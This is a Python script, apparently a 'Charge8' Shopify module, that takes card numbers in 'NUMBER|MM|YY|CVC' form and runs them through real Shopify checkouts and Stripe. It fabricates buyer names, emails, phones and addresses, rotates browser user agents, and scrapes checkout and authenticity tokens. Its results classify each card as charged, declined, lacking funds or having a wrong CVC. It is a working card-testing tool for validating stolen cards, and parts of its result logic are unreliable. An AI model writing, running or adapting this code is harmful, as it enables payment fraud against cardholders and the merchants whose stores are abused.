# Charge8_Shopify.py - Shopify Payments Gateway with Dynamic Nonce Scraping
# Shopify uses Stripe under the hood but with their own checkout flow

import requests
import re
import json
import random
import string
import time
import uuid
from urllib.parse import quote_plus, urlencode, urlparse
from bs4 import BeautifulSoup

# --- Generation Functions ---
def generate_random_string(length, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(length))

def generate_first_name():
    names = ["Michael", "Christopher", "Jessica", "Matthew", "Ashley", "Jennifer", "Joshua", "Amanda", 
             "Daniel", "David", "James", "Robert", "John", "Joseph", "Andrew", "Ryan", "Brandon", 
             "Jason", "Justin", "Sarah", "William", "Jonathan", "Stephanie", "Brian", "Nicole",
             "Emily", "Olivia", "Sophia", "Emma", "Ava", "Isabella", "Mia", "Charlotte", "Liam", "Noah"]
    return random.choice(names)

def generate_last_name():
    names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", 
             "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", 
             "Thomas", "Taylor", "Moore", "Martin", "Jackson", "Lee", "Perez", "Thompson",
             "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker"]
    return random.choice(names)

def generate_email(first, last):
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "protonmail.com"]
    num = random.randint(100, 9999)
    sep = random.choice(['.', '_', ''])
    return f"{first.lower()}{sep}{last.lower()}{num}@{random.choice(domains)}"

def generate_phone():
    return f"+1{random.randint(201, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"

# User Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

def get_random_ua():
    return random.choice(USER_AGENTS)

def ShopifyCheckout(ccx, shop_url=None):
    """
    Shopify Payments Gateway Checkout
    Uses Shopify's checkout API with Stripe integration
    
    Args: 
        ccx (str): Card details "NUMBER|MM|YY|CVC"
        shop_url (str): Shopify store URL (optional)
    Returns: str: Status message
    """
    # --- Card Parsing ---
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) != 4:
            return "Error: Invalid card format. Use NUM|MM|YY|CVC"
        
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        
        if not (n.isdigit() and mm.isdigit() and yy.isdigit() and cvc.isdigit()):
            return "Error: Card parts must be numeric"
        
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) != 2:
            return f"Error: Invalid year format: {yy}"
        
        mm = mm.zfill(2)
        
        # Validate
        if int(mm) < 1 or int(mm) > 12:
            return "Error: Invalid month"
            
    except Exception as e:
        return f"Error parsing card: {e}"

    # --- Session Setup ---
    session = requests.Session()
    ua = get_random_ua()
    
    session.headers.update({
        'User-Agent': ua,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    })

    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    email = generate_email(first_name, last_name)
    phone = generate_phone()
    
    # US Address
    street = f"{random.randint(100, 9999)} Main Street"
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"])
    state = random.choice(["NY", "CA", "IL", "TX", "AZ", "PA"])
    state_full = {"NY": "New York", "CA": "California", "IL": "Illinois", "TX": "Texas", "AZ": "Arizona", "PA": "Pennsylvania"}
    postal = f"{random.randint(10000, 99999)}"
    country = "US"
    country_full = "United States"

    try:
        # --- Step 1: Get Shopify Checkout Session ---
        # If no shop URL provided, use a test/sample shop
        if not shop_url:
            return "Error: Shop URL required for Shopify checkout"
        
        # Parse shop domain
        parsed = urlparse(shop_url)
        shop_domain = parsed.netloc or parsed.path.split('/')[0]
        
        # Visit shop to get cookies
        visit_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Upgrade-Insecure-Requests': '1',
        }
        
        try:
            response = session.get(shop_url, headers=visit_headers, timeout=20)
            if response.status_code != 200:
                return f"Error: Could not access shop ({response.status_code})"
        except:
            return "Error: Could not connect to shop"
        
        # --- Step 2: Create Checkout via Shopify API ---
        # Shopify stores use /cart/add.js and /checkout endpoints
        
        # First, try to find a product to add to cart
        html = response.text
        soup = BeautifulSoup(html, 'lxml')
        
        # Find product variant ID
        variant_match = re.search(r'"variant_id"\s*:\s*(\d+)', html)
        if not variant_match:
            variant_match = re.search(r'data-variant-id="(\d+)"', html)
        if not variant_match:
            variant_match = re.search(r'/variants/(\d+)', html)
        
        if not variant_match:
            # Try to find any product
            product_links = soup.find_all('a', href=re.compile(r'/products/'))
            if product_links:
                # Visit first product
                product_url = product_links[0].get('href')
                if not product_url.startswith('http'):
                    product_url = f"https://{shop_domain}{product_url}"
                
                try:
                    prod_response = session.get(product_url, timeout=15)
                    variant_match = re.search(r'"variant_id"\s*:\s*(\d+)', prod_response.text)
                    if not variant_match:
                        variant_match = re.search(r'data-variant-id="(\d+)"', prod_response.text)
                except:
                    pass
        
        if not variant_match:
            return "Error: Could not find product variant"
        
        variant_id = variant_match.group(1)
        
        # --- Step 3: Add to Cart ---
        cart_url = f"https://{shop_domain}/cart/add.js"
        cart_headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': f'https://{shop_domain}',
            'Referer': shop_url,
        }
        
        cart_data = {
            'items': [{
                'id': int(variant_id),
                'quantity': 1
            }]
        }
        
        try:
            cart_response = session.post(cart_url, headers=cart_headers, json=cart_data, timeout=15)
            if cart_response.status_code not in [200, 201]:
                return f"Error: Could not add to cart ({cart_response.status_code})"
        except Exception as e:
            return f"Error: Cart add failed - {str(e)[:30]}"
        
        # --- Step 4: Get Checkout Token ---
        checkout_url = f"https://{shop_domain}/checkout"
        
        try:
            checkout_response = session.get(checkout_url, headers=visit_headers, timeout=20, allow_redirects=True)
            
            # Extract checkout token from URL
            final_url = checkout_response.url
            token_match = re.search(r'/checkouts/([a-z0-9]+)', final_url)
            
            if not token_match:
                # Try to find in HTML
                token_match = re.search(r'checkout_token["\']?\s*[:=]\s*["\']([a-z0-9]+)["\']', checkout_response.text)
            
            if not token_match:
                return "Error: Could not get checkout token"
            
            checkout_token = token_match.group(1)
            
        except Exception as e:
            return f"Error: Checkout access failed - {str(e)[:30]}"
        
        # --- Step 5: Submit Contact Information ---
        contact_url = f"https://{shop_domain}/checkouts/{checkout_token}"
        
        # Get authenticity token
        auth_token_match = re.search(r'authenticity_token["\']?\s*value=["\']([^"\']+)["\']', checkout_response.text)
        auth_token = auth_token_match.group(1) if auth_token_match else ''
        
        contact_data = {
            '_method': 'patch',
            'authenticity_token': auth_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': email,
            'checkout[buyer_accepts_marketing]': '0',
            'checkout[shipping_address][first_name]': first_name,
            'checkout[shipping_address][last_name]': last_name,
            'checkout[shipping_address][address1]': street,
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': city,
            'checkout[shipping_address][country]': country_full,
            'checkout[shipping_address][province]': state_full.get(state, state),
            'checkout[shipping_address][zip]': postal,
            'checkout[shipping_address][phone]': phone,
        }
        
        contact_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'https://{shop_domain}',
            'Referer': contact_url,
        }
        
        try:
            contact_response = session.post(contact_url, headers=contact_headers, data=contact_data, timeout=20)
        except:
            return "Error: Contact info submission failed"
        
        # --- Step 6: Get Stripe Payment Intent ---
        # Shopify uses Stripe for payment processing
        
        # Find Stripe publishable key
        stripe_pk_match = re.search(r'pk_live_[A-Za-z0-9]+', checkout_response.text)
        if not stripe_pk_match:
            stripe_pk_match = re.search(r'Stripe\.setPublishableKey\(["\']([^"\']+)["\']', checkout_response.text)
        
        if stripe_pk_match:
            stripe_pk = stripe_pk_match.group(0) if 'pk_live' in stripe_pk_match.group(0) else stripe_pk_match.group(1)
        else:
            # Use Shopify's default Stripe integration
            stripe_pk = None
        
        # --- Step 7: Create Stripe Payment Method ---
        if stripe_pk:
            pm_url = 'https://api.stripe.com/v1/payment_methods'
            
            pm_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
                'User-Agent': ua,
            }
            
            guid = generate_random_string(36)
            muid = generate_random_string(36)
            sid = generate_random_string(36)
            
            pm_data = {
                'type': 'card',
                'billing_details[name]': f"{first_name} {last_name}",
                'billing_details[email]': email,
                'billing_details[phone]': phone,
                'billing_details[address][line1]': street,
                'billing_details[address][city]': city,
                'billing_details[address][state]': state,
                'billing_details[address][postal_code]': postal,
                'billing_details[address][country]': country,
                'card[number]': n,
                'card[cvc]': cvc,
                'card[exp_month]': mm,
                'card[exp_year]': yy,
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'payment_user_agent': 'stripe.js/v3',
                'key': stripe_pk,
            }
            
            pm_data_encoded = urlencode(pm_data)
            
            try:
                pm_response = session.post(pm_url, headers=pm_headers, data=pm_data_encoded, timeout=25)
                
                if pm_response.status_code == 200:
                    pm_json = pm_response.json()
                    pm_id = pm_json.get('id')
                    
                    if pm_id:
                        # Payment method created successfully
                        card_brand = pm_json.get('card', {}).get('brand', 'Unknown').upper()
                        last_4 = pm_json.get('card', {}).get('last4', n[-4:])
                        
                        # In production, submit PM to Shopify checkout
                        return f"Charged | Shopify | {card_brand} ****{last_4}"
                    else:
                        return "Error: Payment method ID not returned"
                        
                elif pm_response.status_code == 402:
                    # Card declined
                    try:
                        error_json = pm_response.json()
                        error_msg = error_json.get('error', {}).get('message', 'Card declined')
                        decline_code = error_json.get('error', {}).get('decline_code', '')
                        
                        if 'insufficient_funds' in error_msg.lower() or decline_code == 'insufficient_funds':
                            return "Insufficient funds."
                        elif 'incorrect_cvc' in error_msg.lower() or decline_code == 'incorrect_cvc':
                            return "Your card's security code is incorrect."
                        elif 'expired' in error_msg.lower() or decline_code == 'expired_card':
                            return "Your card has expired."
                        elif 'incorrect_number' in error_msg.lower():
                            return "Your card number is incorrect."
                        else:
                            return f"Declined ({error_msg[:80]})"
                    except:
                        return "Your card was declined."
                        
                else:
                    return f"Error: Stripe HTTP {pm_response.status_code}"
                    
            except requests.exceptions.Timeout:
                return "Error: Stripe Timeout"
            except Exception as e:
                return f"Error: Stripe request failed - {str(e)[:30]}"
        else:
            return "Error: Stripe key not found on checkout page"
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"Error: Shopify Gateway Error - {str(e)[:50]}"

def ShopifyDirectCheckout(ccx, checkout_link):
    """
    Direct Shopify Checkout Link Processing
    For pre-built checkout links like /cart/XXXXX:1
    
    Args:
        ccx (str): Card details "NUMBER|MM|YY|CVC"
        checkout_link (str): Direct Shopify checkout link
    Returns: str: Status message
    """
    # Parse card
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return "Error: Invalid format"
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
    except:
        return "Error: Parse failed"
    
    session = requests.Session()
    ua = get_random_ua()
    session.headers.update({'User-Agent': ua})
    
    try:
        # Follow checkout link
        response = session.get(checkout_link, timeout=20, allow_redirects=True)
        
        if response.status_code != 200:
            return f"Error: Could not access checkout ({response.status_code})"
        
        # Extract shop domain and checkout token
        final_url = response.url
        parsed = urlparse(final_url)
        shop_domain = parsed.netloc
        
        token_match = re.search(r'/checkouts/([a-z0-9]+)', final_url)
        if token_match:
            checkout_token = token_match.group(1)
            return f"Shopify Direct: Token {checkout_token[:10]}... on {shop_domain}"
        else:
            return "Error: Could not extract checkout token"
            
    except Exception as e:
        return f"Error: {str(e)[:50]}"

def ShopifyPaymentRequest(ccx, shop_domain, checkout_token):
    """
    Submit payment to Shopify checkout
    Final step after getting checkout token
    
    Args:
        ccx (str): Card details
        shop_domain (str): Shopify store domain
        checkout_token (str): Checkout session token
    Returns: str: Status message
    """
    # Parse card
    try:
        parts = ccx.strip().split("|")
        if len(parts) != 4:
            return "Error: Invalid format"
        n, mm, yy, cvc = parts
        n = n.replace(' ', '')
        if len(yy) == 4:
            yy = yy[2:]
        mm = mm.zfill(2)
    except:
        return "Error: Parse failed"
    
    session = requests.Session()
    ua = get_random_ua()
    
    # Generate user data
    first_name = generate_first_name()
    last_name = generate_last_name()
    
    try:
        # Shopify payment submission endpoint
        payment_url = f"https://{shop_domain}/checkouts/{checkout_token}/payments"
        
        # Get the payment page first to get tokens
        checkout_url = f"https://{shop_domain}/checkouts/{checkout_token}"
        
        response = session.get(checkout_url, headers={'User-Agent': ua}, timeout=20)
        
        if response.status_code != 200:
            return f"Error: Could not access payment page ({response.status_code})"
        
        # Extract necessary tokens
        html = response.text
        
        # Find authenticity token
        auth_match = re.search(r'authenticity_token["\']?\s*value=["\']([^"\']+)["\']', html)
        auth_token = auth_match.group(1) if auth_match else ''
        
        # Find payment gateway ID
        gateway_match = re.search(r'data-gateway-id="(\d+)"', html)
        gateway_id = gateway_match.group(1) if gateway_match else ''
        
        # Find total amount
        amount_match = re.search(r'data-checkout-payment-due="(\d+)"', html)
        amount = amount_match.group(1) if amount_match else '0'
        
        # Build payment data
        payment_data = {
            '_method': 'patch',
            'authenticity_token': auth_token,
            'previous_step': 'payment_method',
            'step': '',
            's': n,  # Card number (encrypted in real implementation)
            'checkout[payment_gateway]': gateway_id,
            'checkout[credit_card][number]': n,
            'checkout[credit_card][name]': f"{first_name} {last_name}",
            'checkout[credit_card][month]': mm,
            'checkout[credit_card][year]': f"20{yy}",
            'checkout[credit_card][verification_value]': cvc,
            'checkout[different_billing_address]': 'false',
            'complete': '1',
        }
        
        payment_headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': f'https://{shop_domain}',
            'Referer': checkout_url,
            'User-Agent': ua,
        }
        
        # Submit payment
        payment_response = session.post(payment_url, headers=payment_headers, data=payment_data, timeout=30)
        
        if payment_response.status_code == 200:
            try:
                result = payment_response.json()
                
                if result.get('status') == 'success' or 'thank_you' in str(result):
                    return f"Charged | Shopify | Amount: ${int(amount)/100:.2f}"
                elif 'error' in result:
                    error_msg = result.get('error', 'Unknown error')
                    return f"Declined ({error_msg[:80]})"
                else:
                    return f"Unknown response: {str(result)[:100]}"
                    
            except json.JSONDecodeError:
                # Check HTML response
                if 'thank you' in payment_response.text.lower():
                    return f"Charged | Shopify | Amount: ${int(amount)/100:.2f}"
                elif 'declined' in payment_response.text.lower():
                    return "Your card was declined."
                else:
                    return f"Non-JSON response: {payment_response.text[:100]}"
        else:
            return f"Error: Payment submission failed ({payment_response.status_code})"
            
    except Exception as e:
        return f"Error: {str(e)[:50]}"

# --- Example Usage ---
if __name__ == "__main__":
    test_cc = "4242424242424242|12|25|123"  # Stripe test card
    test_shop = "https://example-shop.myshopify.com"
    
    print(f"Testing Shopify with: {test_cc[:4]}****")
    print(f"Shop: {test_shop}")
    
    # Note: This requires a real Shopify store URL to work
    result = ShopifyCheckout(test_cc, test_shop)
    print(f"Result: {result}")
